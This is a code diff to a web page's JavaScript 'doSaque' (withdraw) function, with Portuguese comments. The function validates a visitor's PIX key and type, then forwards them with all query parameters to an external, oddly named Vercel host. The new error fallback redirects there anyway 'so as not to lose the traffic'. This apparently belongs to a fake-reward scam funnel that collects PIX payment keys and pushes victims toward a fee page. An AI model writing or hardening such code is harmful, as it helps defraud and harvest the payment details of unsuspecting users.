@@ -274,29 +274,46 @@ body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-h
   };
 
   window.doSaque = function(){
-    const t = document.getElementById('pixType').value;
-    const key = document.getElementById('pixKey').value.trim();
-    let valid = true;
+    try {
+      const t = document.getElementById('pixType').value;
+      const key = document.getElementById('pixKey').value.trim();
+      let valid = true;
 
-    if(!t){
-      document.getElementById('pixType').classList.add('error');
-      document.getElementById('typeErr').classList.add('show');
-      valid = false;
-    }
-    if(!key || (t && !validators[t]?.(key))){
-      document.getElementById('pixKey').classList.add('error');
-      document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
-      document.getElementById('keyErr').classList.add('show');
-      valid = false;
-    }
-    if(!valid) return;
+      // 1. Valida o tipo de PIX
+      if(!t){
+        document.getElementById('pixType').classList.add('error');
+        document.getElementById('typeErr').classList.add('show');
+        valid = false;
+      }
 
-    // Nova URL de destino inserida aqui
-    const dest = new URL('https://pesqdobttklkjkkjtaxval.vercel.app/', window.location.href);
-    new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
-    dest.searchParams.set('pix_type', t);
-    dest.searchParams.set('pix_key', key);
-    window.location.href = dest.toString();
+      // 2. Valida a chave PIX sem usar o operador '?' para evitar erros em celulares antigos
+      if(!key || (t && validators[t] && !validators[t](key))){
+        document.getElementById('pixKey').classList.add('error');
+        document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
+        document.getElementById('keyErr').classList.add('show');
+        valid = false;
+      }
+
+      // Se estiver inválido, trava o botão aqui e não redireciona
+      if(!valid) {
+        console.warn("Validação PIX falhou. Preencha os campos corretamente para testar.");
+        return; 
+      }
+
+      // 3. Monta a URL e transfere os parâmetros
+      const dest = new URL('https://pesqdobttklkjkkjtaxval.vercel.app/');
+      new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
+      dest.searchParams.set('pix_type', t);
+      dest.searchParams.set('pix_key', key);
+
+      // 4. Força o redirecionamento
+      window.location.assign(dest.toString());
+
+    } catch (erro) {
+      console.error("Erro no script de saque:", erro);
+      // Fallback de emergência para não perder o tráfego caso algo quebre
+      window.location.assign('https://pesqdobttklkjkkjtaxval.vercel.app/');
+    }
   };
 
   // ─── Web Share / Convite ───────────────────────────────────────
